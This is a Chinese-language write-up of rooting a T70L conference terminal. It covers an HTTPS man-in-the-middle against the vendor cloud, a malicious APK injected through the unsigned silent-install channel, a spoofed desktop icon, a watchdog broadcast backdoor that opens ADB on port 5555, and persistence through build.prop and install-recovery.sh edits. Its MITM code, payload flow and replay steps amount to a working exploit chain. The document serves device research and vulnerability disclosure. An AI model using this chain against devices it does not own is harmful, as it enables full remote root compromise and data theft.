# T70L 打通全过程 — 技术路线存档

> 从「刚拆箱、只有一个局域网 IP」到「持久 root」，完整复现路径。
> 记录时间：2026-11-01

---

## 0. 破局思路（为什么走这条路）

设备到手时的情况：
- 有网口 + WiFi，但它是一个**封闭的商用会议终端**，没有开发者选项，没有 ADB 开关
- 设置里「连续点 7 次版本号」无效（厂商删了）
- USB-A 是 Host 口，用 A-A 线接电脑**枚举不出来**（双 Host，物理上就不可能）
- 唯一暴露给用户的可写配置：**服务器地址**

于是整条攻击链的立足点就定在这儿：

```
能改服务器地址
  → 让设备把本机当成云端
  → 中间人拿到全部 API 明文
  → 云端下发什么就装什么（官方静默安装通道）
  → 装上来的 App 拿到 system 级应用身份
  → 用它反过来打开 adbd
  → adb root
```

**关键认知：不需要过签名校验，不需要刷机，不需要拆机。**
厂商自己设计了一套「云端下发 + 静默安装 + 桌面图标直链」的运营机制，我把它当合法通道用。

## 3. 抓包 / MITM（拿协议）

### 3.1 走过的弯路（别再试了）
- **SOCKS5 代理**：设备业务流量走 native socket，不认系统代理，代理服务器只能收到探测包（cmd=3 是 UDP ASSOCIATE 的探测），业务流量根本不进来 → **不可行**
- **纯 HTTP 劫持**：设备后续全走 HTTPS 443 → 只能拿到 TLS 密文

### 3.2 最终方案：本地 HTTPS MITM
设备做 TLS 时**不校验证书指纹**（没有 certificate pinning），而且只要求 TLS 1.0。
所以直接自签一张 `cloud.xylink.com` 的证书就能解密。

脚本：`assets/https_mitm.py`（本机 443 端口）

```python
# 核心要点
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.minimum_version = ssl.TLSVersion.TLSv1      # 设备只支持 TLS1.0
ctx.set_ciphers("ALL:@SECLEVEL=0")              # OpenSSL 3 默认拒绝弱算法，必须降级
ctx.load_cert_chain("cert.pem", "key.pem")      # 自签 cloud.xylink.com
# 收到请求后原样转发到 https://cloud.xylink.com，再把响应返回给设备
```

**踩坑**：OpenSSL 3.x 默认拒 TLS 1.0，握手报 `VERSION_TOO_LOW`。
解决：`minimum_version = TLSv1` **且** `set_ciphers("ALL:@SECLEVEL=0")`，两个都要做。

抓到的原始响应备份在 `assets/captured_https/`（含 8 条桌面图标响应原文）。

## 4. 固件分析（关键发现都在这里）

### 4.0 固件是从哪来的（重要，全网搜不到这台机器的固件）

不是网上下的，是**从厂商自己的 OTA CDN 拿的全量包**。

设备开机会向 `cloud.xylink.com` 查系统更新，我们把域名劫持到本机做 TLS MITM，
抓到了它请求更新接口的原始响应，里面就写着官方下载地址：

```json
{"platform":"crushos","latestVersion":573,"versionName":"2.24.0-573",
 "appUrl":"https://cdn.xylink.com/as/150130/new/octopus_crush_release-ota-2.24.0-573.zip?r=...",
 "md5":"3c5a1098ac942ec9cde2136c2ee60003","packageName":"os"}
```

按这个 URL 下了 **134MB** 全量包：

```
~/re-tools/t70l/firmware/octopus_crush_2.24.0-573.zip
本地 md5 = 3c5a1098ac942ec9cde2136c2ee60003   ← 与 CDN 公布值逐字节一致
```

包内 `META-INF/com/android/metadata`：

```
pre-device    = octopus-f1
post-build    = deva/octopus_f1/octopus-f1:4.4.4/KTU84Q/20190423:userdebug/release-keys
```

与设备 `ro.build.fingerprint` 完全一致 —— **同机型、同版本，不是别的机器的固件**。
包 `signed by SignApk`，是官方签名包。

> 📌 **这个方法可复用**：封闭设备"找不到固件"时，别去搜，去**劫持它自己的更新检查请求**。
> 厂商的 OTA CDN 通常是公开的，设备会主动把地址告诉你。

固件解包后的目录结构（原始备份在 `$HOME/re-tools/t70l/firmware/extracted/`）：
```
system/         完整 /system 镜像内容
boot.img        + 解出的 ramdisk
build.prop
fstab.sun8i
```

### 4.1 有哪些云端接口

| 接口 | 作用 |
|---|---|
| `GET /api/rest/crtt2` | 时间同步，返回 `{"time":<ms>}` |
| `GET /api/rest/version?platform=thirdapp&sn=...` | **第三方应用列表 `apkList`** ← 静默安装入口 |
| `GET /api/rest/v3/nemo/{id}/customizedfeatures` | **桌面图标配置** ← 注入入口 |
| `GET /api/rest/v3/circleofnemo/{id}` | 长轮询，正常回 204 |

### 4.2 静默安装（NemoUpdateService）

解析 `vulture.update_service` 得到逻辑：

```
解析 apkList 每一项:
    versionCode   版本号
    devRevision   MD5 前 4 位（校验用）
    appUrl        APK 下载地址（可 http）
    reserveFlag   保留标志
→ 下载 APK
→ 计算 MD5 前 4 位与 devRevision 比对
→ 调用 InstallUtils.install() → 实际执行 pm install -r
```

**没有任何签名校验**。只要 MD5 前 4 位对上，随便什么 APK 都能装。
装出来的是 **system 级 App**（不是普通用户安装）。

### 4.3 桌面图标（vulture.app.home）

`vulture/a/c.java` 里做图标过滤，`vulture/business/u.java` 处理点击。
图标列表完全来自 `customizedfeatures` 接口的响应，字段：
```
displayName   显示名
priority      排序
sourceType    2 = 直接用 url 拉起
url           要拉起的包名
icon          图标 URL
```

**这意味着：我能在它桌面上凭空插一个图标，点一下就拉起任意包。**

### 4.4 看门狗后门（vulture.watchdog）

`NemoWatchdog` 监听广播 `com.vulture.watchdog.EXECMD`：

```java
// 唯一的鉴权：frompackage 这个字符串等于 "vulture.app.home"
if ("vulture.app.home".equals(intent.getStringExtra("frompackage"))) {
    Watchdog.executeCommand(cmd);
}
```

`executeCommand` 支持的命令里有一条 **`enablenetadbs <port>`**：

```
SystemProperties.set("service.adb.tcp.port", "5555")
stop adbd; start adbd
```

**这就是官方留的调试后门，只校验一个字符串。**
只要我的 App 能发这个广播，adbd 就起来了，而且是以系统身份配置的。

### 4.5 另一个后门（没走通，记录一下）
`UsbStorageReceiver.enableSysDebug()` 也能开调试，但它要校验**厂商私钥签名**，
密钥在 `/mnt/private`（vfat）里，拿不到 → 放弃这条线。

## 5. 载荷设计（payload）

源码：`assets/payload/src/com/nemo/devtools/MainActivity.java`
产物：`assets/payload/devtools.apk`（16KB，签名 dev.keystore，devRevision = MD5 前 4 位）

执行流程：

```
1. 采集硬件信息（meminfo / cpuinfo / getprop / df / display / 分区 / 包列表）
2. POST 到 http://192.168.1.210:8099/report
3. 发送广播 com.vulture.watchdog.EXECMD
      frompackage = "vulture.app.home"
      cmd = "enablenetadbs 5555"
4. 自检：连 127.0.0.1:5555 确认 adbd 已开
5. 结果再 POST 一次（很短的那份报告就是自检结果）
```

**踩坑记录**：
- d8 对匿名内部类报错 → 改成同步执行，禁止在 UI 线程外做网络
- 新装 APK 处于 **stopped 状态**，`BOOT_COMPLETED` 广播收不到、无法自启
  → 所以必须靠**桌面图标点击**来触发第一次运行（用户点一下就行）

## 6. 完整入侵时序（真正跑通的那一次）

```
① Mac 启动两个服务
     python3 https_mitm.py      # 443，TLS MITM + 注入
     python3 report_server.py   # 8099，分发 APK/图标 + 接收上报

② MITM 在两处做手脚
     /api/rest/version?platform=thirdapp
        → apkList 里追加 devtools（appUrl = http://192.168.1.210:8099/payload.apk）
     /api/rest/v3/nemo/{id}/customizedfeatures
        → 追加一条 tile：displayName="系统工具", priority=200, url="com.nemo.devtools"

③ 设备联网 → 拉取配置 → 自动下载并静默安装 devtools.apk
     → 桌面第一页出现蓝色「系统工具」图标

④ 用户点一下图标
     → payload 运行，采集硬件，POST 回来（16KB 报告）
     → 发 EXECMD 广播 → watchdog 执行 enablenetadbs 5555
     → adbd 以 5555 端口重启

⑤ Mac 上
     adb connect 192.168.1.153:5555     → device 上线
     adb root                            → restarting adbd as root
     adb shell id                        → uid=0(root)  ✅
```

验证：`nc -z 192.168.1.153 5555` 返回 succeeded，`adb devices` 显示
`192.168.1.153:5555  device  product:octopus_f1 model:T70L`。

## 7. root 的真实形态（意外之喜）

原本以为还要自己塞 su，结果发现**系统自带**：

```bash
$ adb shell ls -l /system/xbin/su
-rwsr-sr-x root root 75348 /system/xbin/su

$ adb shell 'su -c id'
uid=0(root) gid=0(root) context=u:r:su:s0     # 直接放行，无授权弹窗
```

- `setuid root` + 有独立的 SELinux 域 `u:r:su:s0`（说明策略里专门开了）
- **不需要 SuperSU / Magisk 授权管理**，任何 App 调用 `su` 都直接拿到 root
- 这意味着：**后续装的任何 App 只要会 `Runtime.exec("su")` 就能干任何事**

另外两个有利条件：
- `ro.adb.secure=0` → adbd 不校验 RSA 密钥，谁连都行
- `ro.build.type=userdebug` → 允许 `adb root`（虽然 `ro.debuggable=0`）

> 关于 Magisk：**Android 4.4 装不了**。Magisk 最低要求 Android 6.0（部分功能 5.0）。
> KernelSU 要求 GKI 内核 5.10+，APatch 要求 3.18+ 且带 kallsyms，这台 3.4.39 + SELinux 都没有对应实现。
> **结论：这台机器的 root 比 Magisk 更彻底**（直接 setuid su，无授权层），不需要面具。

## 8. 持久化（让它断电重启也不丢）

只靠广播开 adbd 是一次性的，重启就没了。做了两层保险：

### 第一层：build.prop（主方案）
在 `/system/build.prop` 末尾追加：
```properties
# --- adb persist ---
service.adb.tcp.port=5555     # adbd 启动就监听 5555
service.adb.root=1            # adbd 直接以 root 跑，不用 adb root
persist.service.adb.enable=1
```

### 第二层：install-recovery.sh（兜底）
`/init.rc` 里有：
```
service flash_recovery /system/etc/install-recovery.sh    # 开机自动执行
on property:sys.service.adbd.enable=1 → restart adbd      # 厂商自带的属性触发器
```
所以往 `install-recovery.sh` 末尾追加：
```sh
setprop service.adb.tcp.port 5555
setprop service.adb.root 1
setprop sys.service.adbd.enable 1     # 触发上面那条 restart adbd
log -t adbpersist "adb tcp port forced to 5555"
```

### 操作要点（Android 4.4 特有坑）
- 设备 shell 的 toolbox **极度精简**：没有 `printf`、`tail`、`head`、`sort`、`base64`
  → 不要在设备上拼文件，**在 Mac 上改好再 push**
- 改完必须：
  ```bash
  mount -o rw,remount /system
  chown 0:0 <file>; chmod 644 <file>
  chcon u:object_r:system_file:s0 <file>    # 不改 SELinux 标签会读不到
  sync
  ```
- `install-recovery.sh` 原权限是 **544**（`-r-xr--r--`），别改成 550

### 验证结果（2026-11-01 16:07 实测）
```
重启 → 12 秒后 5555 端口 OPEN
adb shell id → uid=0(root)          ← 不需要 adb root
adb shell getprop service.adb.tcp.port → 5555
```
✅ **一次成功，不再需要点任何图标，不再需要 MITM 服务在线。**

## 9. 踩过的所有坑（省得再走一遍）

| 坑 | 现象 | 结论 |
|---|---|---|
| USB A-A 连线 | 电脑端无任何枚举 | 设备 USB 是 Host 口，A-A 接法物理不可能通 |
| 连点版本号 7 次 | 无反应 | 厂商删除了开发者选项入口 |
| SOCKS5 代理 | 只有探测包，无业务流量 | native socket 不读系统代理，**此路不通** |
| HTTPS 握手 | `VERSION_TOO_LOW` | 需 `TLSv1` + `ALL:@SECLEVEL=0` 双管齐下 |
| 接口名拼写 | `customedfeatures` 抓不到 | 真名是 `customizedfeatures`（有 i） |
| APK 装完不自启 | 广播收不到 | 新装包是 stopped 状态，必须用户点图标启动 |
| 设备 shell 缺工具 | `printf: not found` | 本地改文件再 push，别在设备上生成 |
| 改文件权限 | 600/550 导致读失败 | build.prop=644，install-recovery.sh=544 |
| SELinux 拦读写 | 文件在但读空 | 必须 `chcon u:object_r:system_file:s0` |

## 11. 如果要从头再来一遍（恢复出厂后）

1. 设备设置里改服务器地址 → Mac IP，重启
2. Mac 上跑 `https_mitm.py` + `report_server.py`
3. 等设备自动装好「系统工具」并出现图标（约 1-3 分钟）
4. 点图标 → 等 5 秒 → `adb connect <设备IP>:5555`
5. `adb root` → `adb shell id` 确认 uid=0
6. 重做第 8 节持久化

> 注意：`https_mitm.py` 里硬编码了 `192.168.1.210`，换网络环境要改这个 IP
> （`PAYLOAD_URL`、`ICON_URL`，以及 payload 里的 `REPORT` 地址，改完要重新编译 APK）。
